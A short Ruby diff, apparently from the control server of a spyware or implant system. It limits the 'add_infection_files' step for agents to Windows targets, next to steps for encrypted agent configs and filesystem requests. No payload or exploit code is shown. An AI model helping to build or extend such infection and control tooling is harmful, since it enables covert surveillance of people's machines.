@@ -350,7 +350,7 @@ class AgentController < RESTController
     agent.add_first_time_uploads
 
     # add the files needed for the infection module
-    agent.add_infection_files
+    agent.add_infection_files if agent.platform == 'windows'
 
     # add default requests for the filesystem
     agent.add_default_filesystem_requests
@@ -389,7 +389,7 @@ class AgentController < RESTController
         config.save
 
         # add the files needed for the infection module
-        agent.add_infection_files
+        agent.add_infection_files if agent.platform == 'windows'
 
         # encrypt the config for the agent using the confkey
         enc_config = config.encrypted_config(agent[:confkey])
